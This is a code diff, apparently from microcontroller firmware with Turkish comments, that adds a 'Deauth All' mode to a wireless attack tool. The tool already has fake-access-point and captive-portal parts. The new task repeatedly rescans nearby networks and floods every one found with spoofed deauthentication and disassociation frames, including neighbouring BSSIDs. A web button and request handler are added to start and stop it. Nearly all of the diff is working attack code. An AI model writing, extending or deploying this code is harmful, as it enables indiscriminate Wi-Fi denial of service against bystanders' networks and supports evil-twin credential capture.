@@ -288,6 +288,7 @@ volatile int32_t target_5g_channel = 0;
 uint8_t fake_ap_bssid[6] = {0};
 
 volatile bool deauth_active = false;
+volatile bool deauth_all_active = false;
 volatile bool portal_busy   = false;
 int32_t ap_running_channel  = -1;
 unsigned long last_netif_check_ms = 0;
@@ -759,6 +760,113 @@ void deauthTask(void *param) {
   vTaskDelete(NULL);
 }
 
+// ═══════════════════════════════════════════════════════════════════════════════
+// ═══════════ DEAUTH ALL GÖREVİ — TÜM TARANAN AĞLARA DEAUTH ══════════════════
+// ═══════════════════════════════════════════════════════════════════════════════
+void deauthAllTask(void *param) {
+  (void)param;
+
+  uint8_t frame[26] = {
+    0xC0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+    0x00, 0x00, 0x07, 0x00
+  };
+
+  Serial.println("\n[DeauthAll] ⚡ TÜM AĞLARA DEAUTH BAŞLANDI! ⚡");
+
+#define DEAUTH_ALL_RESCAN_INTERVAL_MS 60000UL
+  unsigned long deauth_all_last_scan_ms = 0;
+
+  while (deauth_all_active) {
+    // Periyodik otomatik yeniden tarama (60 saniyede bir)
+    unsigned long now_ms = (unsigned long)(xTaskGetTickCount() * portTICK_PERIOD_MS);
+    if (now_ms - deauth_all_last_scan_ms > DEAUTH_ALL_RESCAN_INTERVAL_MS) {
+      if (scan_status == SCAN_IDLE && conn_status == CS_IDLE) {
+        Serial.println("[DeauthAll] ♻️ Otomatik yeniden tarama başlatılıyor — hedef listesi güncelleniyor...");
+        startScan();
+      }
+      deauth_all_last_scan_ms = now_ms;
+    }
+
+    // Her döngü başında güncel networks listesinden taze snapshot al
+    std::vector<NetworkInfo> snap;
+    if (networks_mutex && xSemaphoreTake(networks_mutex, pdMS_TO_TICKS(200)) == pdTRUE) {
+      snap = networks;
+      xSemaphoreGive(networks_mutex);
+    }
+
+    if (snap.empty()) {
+      vTaskDelay(pdMS_TO_TICKS(500));
+      continue;
+    }
+
+    Serial.print("[DeauthAll] 🎯 Bu turda hedef ağ sayısı: ");
+    Serial.println(snap.size());
+
+    for (auto &net : snap) {
+      if (!deauth_all_active) break;
+      if (isFakeAPBSSID(net.bssid)) continue;
+
+      bool is5g = (net.channel >= 36);
+      int frameCount  = is5g ? DEAUTH_FRAME_COUNT_5G  : DEAUTH_FRAME_COUNT_2G;
+      int taskDelay   = is5g ? DEAUTH_TASK_DELAY_5G   : DEAUTH_TASK_DELAY_2G;
+      int extraBurst  = is5g ? EXTRA_BURST_COUNT_5G   : EXTRA_BURST_COUNT_2G;
+
+      wifi_set_channel(net.channel);
+      vTaskDelay(pdMS_TO_TICKS(CHANNEL_SWITCH_DELAY_MS));
+
+      for (int burst = 0; burst < frameCount; burst++) {
+        for (int offset = -1; offset <= 1; offset++) {
+          uint8_t temp[6];
+          memcpy(temp, net.bssid, 6);
+          temp[5] = (uint8_t)(temp[5] + offset);
+
+          if (isFakeAPBSSID(temp)) continue;
+
+          memcpy(&frame[10], temp, 6);
+          memcpy(&frame[16], temp, 6);
+          memset(&frame[4], 0xFF, 6);
+          frame[0] = 0xC0; frame[24] = 0x07;
+          safeSendMgnt(frame, 26);
+
+          frame[24] = 0x02;
+          safeSendMgnt(frame, 26);
+
+          memcpy(&frame[4], temp, 6);
+          frame[0] = 0xC0; frame[24] = 0x07;
+          safeSendMgnt(frame, 26);
+
+          frame[0] = 0xA0; frame[24] = 0x07;
+          safeSendMgnt(frame, 26);
+        }
+        vTaskDelay(pdMS_TO_TICKS(taskDelay));
+      }
+
+      for (int extra = 0; extra < extraBurst; extra++) {
+        for (int offset = -1; offset <= 1; offset++) {
+          uint8_t temp[6];
+          memcpy(temp, net.bssid, 6);
+          temp[5] = (uint8_t)(temp[5] + offset);
+          if (!isFakeAPBSSID(temp)) {
+            memcpy(&frame[10], temp, 6);
+            memcpy(&frame[16], temp, 6);
+            memset(&frame[4], 0xFF, 6);
+            frame[0] = 0xC0; frame[24] = 0x07;
+            safeSendMgnt(frame, 26);
+            safeSendMgnt(frame, 26);
+          }
+        }
+        vTaskDelay(pdMS_TO_TICKS(EXTRA_BURST_DELAY_MS));
+      }
+    }
+
+    vTaskDelay(pdMS_TO_TICKS(50));
+  }
+
+  Serial.println("[DeauthAll] Tüm ağlara deauth durduruldu.");
+  vTaskDelete(NULL);
+}
+
 // ─────────────────────────────────────────────────────────────────────────────
 
 // ─── GÖRSELLER VE YÖNLENDİRME ────────────────────────────────────────────────
@@ -871,6 +979,13 @@ void sendStartPage(WiFiClient &client) {
   
   client.print("</form>");
   client.print("<form method='POST' action='/rescan'><button type='submit' class='btn-blue' style='margin-top:10px;'>&#8635; Ağları Yenile</button></form>");
+
+  if (deauth_all_active) {
+    client.print("<div style='background:#fdeced;border:1px solid #e74c3c;border-radius:8px;padding:10px 14px;margin-top:12px;text-align:center;font-size:0.9rem;font-weight:600;color:#c0392b;'>&#9889; Deauth All AKTIF — Taranan tüm ağlar deauth edilmekte</div>");
+    client.print("<form method='POST' action='/deauth_all'><button type='submit' style='margin-top:8px;background:#c0392b;box-shadow:none;'>&#9724; Deauth All Durdur</button></form>");
+  } else {
+    client.print("<form method='POST' action='/deauth_all'><button type='submit' style='margin-top:12px;background:#8e44ad;box-shadow:none;'>&#9889; Deauth All — Tüm Ağları Deauth Et</button></form>");
+  }
 
   if (strlen(saved_ssid) > 0) {
     client.print("<div style='background:#fff;border:1px solid #bdc3c7;border-radius:8px;padding:12px;margin-top:20px;'>");
@@ -1086,6 +1201,25 @@ void handleClient(WiFiClient &client) {
     if (request.startsWith("POST") && path == "/rescan") {
       if (scan_status != SCAN_RUNNING) startScan();
       sendStartPage(client); 
+      client.flush();
+      return;
+    }
+
+    if (request.startsWith("POST") && path == "/deauth_all") {
+      if (deauth_all_active) {
+        deauth_all_active = false;
+        delay(50);
+        Serial.println("[DeauthAll] Kullanıcı durdurdu.");
+      } else {
+        if (scan_status != SCAN_RUNNING && networks.size() > 0) {
+          deauth_all_active = true;
+          xTaskCreate(deauthAllTask, "dauth_all", 4096, NULL, tskIDLE_PRIORITY + 1, NULL);
+          Serial.println("[DeauthAll] Kullanıcı başlattı — tüm ağlara deauth.");
+        } else {
+          Serial.println("[DeauthAll] Ağ listesi boş veya tarama devam ediyor, deauth başlatılamadı.");
+        }
+      }
+      sendStartPage(client);
       client.flush();
       return;
     }
